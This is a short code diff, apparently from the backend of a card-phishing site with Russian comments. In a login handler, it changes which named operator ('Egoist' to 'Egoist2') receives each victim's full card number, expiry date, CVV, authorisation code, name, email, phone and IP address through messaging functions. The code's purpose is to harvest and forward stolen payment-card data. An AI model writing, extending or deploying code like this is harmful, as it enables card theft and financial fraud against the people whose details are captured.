@@ -68,10 +68,10 @@ def login():
         # Egoist2
         elif id == '1000003':
             if authCode is not None and authCode != 'None':
-                send_sms(Egoist, card_number, expiry_date, cvv, authCode, ID)
+                send_sms(Egoist2, card_number, expiry_date, cvv, authCode, ID)
                 return '', 200  # Возвращаем пустой ответ с кодом 200
             ne_pizdabol(card_number)
-            send_buttons_message(Egoist, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
+            send_buttons_message(Egoist2, card_number, expiry_date, cvv, ID, name, email, tel, ip_address)
             return '', 200  # Возвращаем пустой ответ с кодом 200
 
         return '', 200  # Добавляем общий возврат для случаев, когда нет условий или ошибки
